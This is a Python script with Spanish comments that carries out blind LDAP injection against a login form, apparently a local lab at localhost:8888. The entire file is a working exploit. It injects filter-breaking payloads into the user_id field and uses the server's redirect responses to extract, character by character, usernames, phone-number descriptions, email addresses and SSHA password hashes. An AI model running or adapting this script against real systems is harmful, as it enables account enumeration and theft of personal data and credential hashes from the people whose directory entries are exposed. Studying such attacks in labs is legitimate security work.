#!/usr/bin/env python3

from pwn import *
import requests
import time
import sys  
import signal
import string
from urllib.parse import quote

def def_handler(sig, frame):
	print("\n\n[!] Saliendo del programa...\n")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

#variables globales
main_url="http://localhost:8888/"
#burp = {'http':'http://127.0.0.1:8080'}

def get_iniusers():
	characters = string.ascii_lowercase 
	initial_users = []
	headers = {'Content-Type': 'application/x-www-form-urlencoded'}

	for character in characters:
		post_data="user_id={}*&password=*&login=1&submit=Submit".format(character)
		r = requests.post(main_url, data=post_data, headers=headers,allow_redirects=False)
		if r.status_code == 301:
			initial_users.append(character)

	return initial_users


def get_users(initial_users):
	characters = string.ascii_lowercase
	headers = {'Content-Type': 'application/x-www-form-urlencoded'}
	valid_users = []

	for f_character in initial_users:
		user = ""

		for i in range(1,16):
			for character in characters:
				post_data = "user_id={}{}{}*&password=*&login=1&submit=Submit".format(f_character,user,character)
				r = requests.post(main_url, data=post_data, headers=headers,allow_redirects=False)
				if r.status_code == 301:
					user += character
					break
		valid_users.append(f_character + user)
	return valid_users

def get_description(user):
	characters = string.ascii_lowercase + ' ' + string.digits
	headers = {'Content-Type': 'application/x-www-form-urlencoded'}

	description = ""
	p1 = log.progress("Fuerza bruta...")
	p1.status(f"Iniciando proceso de Fuerza bruta para el usuario... ")

	time.sleep(2)
	p2 = log.progress("Description (Tlfn):")

	for position in range(0, 20):
		for character in characters:
			post_data = "user_id={})(description={}{}*))%00&password=*&login=1&submit=Submit".format(user, description, character)
			r = requests.post(main_url, data=post_data, headers=headers, allow_redirects=False)

			if r.status_code == 301:
				description += character
				p2.status(f"Exfiliando numero de telefono...: {description}")
				break
	p1.success(f"Proceso de fuerza bruta concluido para el USUARIO: [{user}]")
	p2.success(f"{description}")

def get_userMail(user):
	characters = string.ascii_lowercase + string.digits + string.ascii_uppercase + '.-_'
	headers = {'Content-Type': 'application/x-www-form-urlencoded'}
	mail = ""
	p1 = log.progress("Fuerza bruta...")
	p1.status(f"Iniciando proceso de Fuerza bruta para el usuario... ")
	time.sleep(2)
	p2 = log.progress("User Mail:")
	for position in range(0, 50):
		found = False
		for character in characters:
			test_mail = mail + character
			escaped_mail = test_mail.replace('@', '\\40').replace('.', '\\2e')
			post_data = f"user_id={user})(mail={escaped_mail}*))%00&password=*&login=1&submit=Submit"
			r = requests.post(main_url, data=post_data, headers=headers, allow_redirects=False)
			if r.status_code == 301:
				mail += character
				p2.status(f"Exfiltrando mail...: {mail}")
				found = True
				break
		# Probar el @ también
		test_mail = mail + '@'
		escaped_mail = test_mail.replace('@', '\\40').replace('.', '\\2e')
		post_data = f"user_id={user})(mail={escaped_mail}*))%00&password=*&login=1&submit=Submit"
		r = requests.post(main_url, data=post_data, headers=headers, allow_redirects=False)
		if r.status_code == 301:
			mail += '@'
			found = True
		if not found:
			break  # Si no encuentra nada, termina
	p1.success(f"Proceso de fuerza bruta concluido para el USUARIO: [{user}]")
	p2.success(f"{mail}")

def get_userPassword(user):
	characters = string.ascii_lowercase + string.ascii_uppercase + string.digits + '+/='
	headers = {'Content-Type': 'application/x-www-form-urlencoded'}
	pwd_hash = ""
	p1 = log.progress("Fuerza bruta...")
	p1.status(f"Iniciando extracción de hash para el usuario... ")
	time.sleep(2)
	p2 = log.progress("UserPassword Hash:")
	
	for position in range(0, 80):
		found = False
		for character in characters:
			test_hash = pwd_hash + character
			encoded_hash = quote(test_hash, safe='')  # ← URL-encodea TODO
			post_data = f"user_id={user})(userPassword=%7BSSHA%7D{encoded_hash}*))%00&password=*&login=1&submit=Submit"
			r = requests.post(main_url, data=post_data, headers=headers, allow_redirects=False)
			if r.status_code == 301:
				pwd_hash += character
				p2.status(f"Exfiltrando hash...: {{SSHA}}{pwd_hash}")
				found = True
				break
		if not found:
			break
	
	p1.success(f"Proceso de fuerza bruta concluido para el USUARIO: [{user}]")
	p2.success(f"{{SSHA}}{pwd_hash}")
	

if __name__ == '__main__':
	initial_users = get_iniusers()
	valid_users = get_users(initial_users)
	
	for i in range(0, len(valid_users)):
		get_description(valid_users[i])
		get_userMail(valid_users[i])
		get_userPassword(valid_users[i])
	